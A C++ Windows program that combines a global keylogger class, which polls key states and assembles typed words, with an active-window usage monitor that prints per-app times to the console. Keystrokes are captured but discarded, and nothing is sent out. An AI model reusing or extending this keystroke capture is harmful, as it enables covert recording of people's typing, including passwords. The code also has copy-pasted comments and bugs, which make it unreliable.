#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <time.h>
#include <fstream>
#include <vector>
#include <iterator>
#include <tchar.h>
#include <functional>
#include <atlstr.h>
#include <map>
#include <locale>
#include <codecvt>
#include <psapi.h>
#include <chrono>
#include <iostream>
#include <shlwapi.h>
#include <sstream>
#include <iomanip>
#include <thread>
#include <libloaderapi.h>
#include "ProcessMonitor.h"
#include "Looper.h"
#pragma comment(lib, "psapi.lib")
/*
* Return the current pressed key or null
*/
bool IsSpecialKey(int S_Key) {
    switch (S_Key)
    {
        case '¾': 
        case VK_SHIFT:
        case VK_RBUTTON:
        case VK_CAPITAL:
        case VK_CONTROL:
        case VK_MENU:
            return true;
        default:
            return false;
    }
}
/*
* Return the current pressed key or null
*/
class KeyLogger {
    /*
    * All the words written by the user.
    * public: static std::vector<std::string> words;
    */
    /*
    * Start the KeyLogger loop.
    */
    public: static void Start(void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
    {
        std::string word;
        while (true) {
            Sleep(10);
            word = KeyLogger::OnNewWord(word, charCallback, wordCallback);
        }
    }
    /*
    * Start the KeyLogger loop.
    */
    public: static std::string OnNewWord(std::string word, void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
    {
        char character = KeyLogger::CatchChar();
        if (character == NULL) return word;
        word = KeyLogger::BuildWord(character, word, wordCallback);
        charCallback(character);
        return word;
    }
    /*
    * Return the current pressed key or null
    */
    public: static std::string BuildWord(char character, std::string word, const std::function<void(std::string)>& callback)
    {
        if (character == NULL) return word;
        if (IsWordEnder((int)character)) {
            callback(word);
            return "";
        }
        if ((int)character == VK_BACK) word.pop_back();
        return word + character;
    }
    /*
    * Return the current pressed key or null
    */
    public: static bool IsWordEnder(int character)
    {
        switch (character)
        {
            case VK_RETURN:
            case VK_SPACE:
            case VK_TAB:
            case VK_UP:
            case VK_DOWN:
            case VK_LEFT:
            case VK_RIGHT:
                return true;
            default:
                return false;
        }
    }
    /*
    * Return the current pressed key or null
    */
    public: static char CatchChar()
    {
        char KEY = 'x';
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767 && !IsSpecialKey(KEY)) return char(KEY);
        }
        return NULL;
    }
    /*
    * Return the current pressed key or null
    */
    public: static void ForEachChar(void(*callback)(char))
    {
        KeyLogger::Start(callback, [](std::string s) {});
    }
    /*
    * Return the current pressed key or null
    */
    public: static void ForEachWord(const std::function<void(std::string)>& callback)
    {
        KeyLogger::Start([](char c){}, callback);
    }
};
/// <summary>
/// 
/// </summary>
/// <param name="x"></param>
/// <param name="y"></param>
void gotoxy(int x, int y) {
    HANDLE hcon;
    hcon = GetStdHandle(STD_OUTPUT_HANDLE);
    COORD dwPos;
    dwPos.X = x;
    dwPos.Y = y;
    SetConsoleCursorPosition(hcon, dwPos);
}
/// <summary>
/// 
/// </summary>
/// <param name="x"></param>
/// <param name="y"></param>
void drawtimeline(std::vector<std::pair<std::string, std::string>> timeline)
{
    gotoxy(0, 20);
    for (auto const& [key, val] : timeline)
    {
        std::cout << key << " ---> active at: " << val << std::endl;
    }
}
/// <summary>
/// 
/// </summary>
/// <param name="x"></param>
/// <param name="y"></param>
void draw(std::map<std::string, int> apps, std::vector<std::pair<std::string, std::string>> timeline)
{
    // system("CLS");
    gotoxy(0, 0);
    for (auto const& [key, val] : apps)
    {
        // std::cout << key << " " << ((double) val) / 1000 << "s" << std::endl;
        double sec = ((double)val) / 1000;
        std::stringstream stream;
        stream << std::fixed << std::setprecision(2) << sec;
        std::string s = stream.str();
        std::cout << key << ": " << s << "s " << std::string(val/6000, char(178))  << std::endl;
    }
    drawtimeline(timeline);
}
/// <summary>
/// 
/// </summary>
/// <returns></returns>
int main()
{
    //
    bool monitor = true;
    bool delay = 50; // 50 ms
    std::vector<std::string> words;
    std::string word = "";
    std::string activeWindow = "";
    std::map<std::string, int> apps;
    std::vector<std::pair<std::string, std::string>> timeline;
    // infinite loop each 200 ms
    std::thread windowThread = Looper::Thread(100, true, [&activeWindow, &apps, &timeline]() {
        // 
        activeWindow = ProcessMonitor::OnWindowChange(activeWindow, [&timeline](std::string w) {
            // active window has been changed!!
            std::time_t now = std::time(nullptr);
            char snow[26];
            ctime_s(snow, sizeof snow, &now);
            // using namespace std::chrono;
            // auto local = zoned_time{ current_zone(), system_clock::now() };
            timeline.push_back({ w, snow });
        });
        auto app = apps.find(activeWindow);
        if (app == apps.end()) apps.insert({ activeWindow, 0 });
        else {
            int acc = app->second;
            // std::cout << acc << std::endl;
            apps.erase(activeWindow);
            apps.insert({ activeWindow, (acc + 200) });
        }
        draw(apps, timeline);
    });
    // 
    std::thread keyloggerThread = Looper::Thread(50, true, [&word]() {
        //
        word = KeyLogger::OnNewWord(word, [](char c) {}, [](std::string w) {
            // new word appear!!
            // std::cout << w << std::endl;
        });
    });
    windowThread.join();
    keyloggerThread.join();
    return 0;
}
